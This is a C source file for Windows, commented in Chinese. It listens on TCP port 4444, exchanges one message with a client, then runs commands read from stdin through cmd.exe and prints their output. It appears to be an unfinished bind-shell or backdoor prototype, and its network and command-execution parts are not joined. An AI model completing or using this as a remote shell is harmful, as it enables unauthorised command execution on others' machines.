#define _WINSOCK_DEPRECATED_NO_WARNINGS
//#include<Windows.h>
#include<stdio.h>
#include<WinSock2.h>
#pragma comment (lib,"ws2_32")

#define BUFFER 1024
void tcp(void)
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	//建立socket
	SOCKET sListen = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	//設定socket 資料結構訊息
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = inet_addr("192.168.1.20");
	server_addr.sin_port = htons(4444);

	//bind
	bind(sListen, (SOCKADDR*)&server_addr, sizeof(server_addr));

	//listen
	listen(sListen, SOMAXCONN);

	//連接請球
	sockaddr_in client_addr;
	int size = sizeof(client_addr);

	SOCKET sClient = accept(sListen, (SOCKADDR*)&client_addr, &size);
	printf("ClientIP=%s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

	//發送訊息
	char szMessage[MAXBYTE] = { 0 };
	lstrcpyA(szMessage, "hello from client!\n");
	send(sClient, szMessage, strlen(szMessage) + sizeof(char), 0);

	//接收訊息
	memset(szMessage, 0, sizeof(szMessage));
	recv(sClient, szMessage, MAXBYTE, 0);
	printf("%s\n", szMessage);

	WSACleanup();
}
int main()
{
	tcp();
	BOOL ok = TRUE;
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	PROCESS_INFORMATION pi = {};
	WCHAR szCommand[BUFFER] = { 0 };

	while (fgetws(szCommand, sizeof(szCommand), stdin))
	{
		//create 2 pipes
		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),NULL,TRUE };
		ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
		{
			if (ok == FALSE)
				return EXIT_FAILURE;
		}
		ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
		{
			if (ok == FALSE)
				return EXIT_FAILURE;
		}
		WCHAR szFullCommand[BUFFER + 32] = { 0 };
		//create process
		STARTUPINFO si = { 0 };
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdError = hStdOutPipeWrite;
		si.hStdOutput = hStdOutPipeWrite;
		si.hStdInput = hStdInPipeRead;
		LPCWSTR ipApplicationName = L"C:\\Windows\\System32\\cmd.exe";
		LPWSTR ipCommandLine = (LPWSTR)L"C:\\Windows\\System32\\cmd.exe /c %s";
		LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
		LPSECURITY_ATTRIBUTES lpThreadAttribute = NULL;
		BOOL bInheritHandles = TRUE;
		DWORD dwCreationFlags = 0;
		LPVOID lpEnviroment = NULL;
		LPCWSTR lpCurrentDirectory = NULL;
		wsprintfW(szFullCommand, ipCommandLine, szCommand);
		ok = CreateProcess(
			ipApplicationName,
			szFullCommand,
			lpProcessAttributes,
			lpThreadAttribute,
			bInheritHandles,
			dwCreationFlags,
			lpEnviroment,
			lpCurrentDirectory,
			&si,
			&pi);
		if (ok == FALSE)
			return EXIT_FAILURE;
		CloseHandle(hStdOutPipeWrite);
		CloseHandle(hStdInPipeRead);

		char buf[1024 + 1] = { };
		DWORD dwRead = 0;
		DWORD dwAvail = 0;
		ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
		while (ok == TRUE)
		{
			buf[dwRead] = '\0';
			OutputDebugStringA(buf);
			puts(buf);
			ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
		}

	}
	//clean up and exit
	CloseHandle(hStdOutPipeRead);
	CloseHandle(hStdInPipeWrite);
	DWORD dwExitCode = 0;
	GetExitCodeProcess(pi.hProcess, &dwExitCode);
	return dwExitCode;





}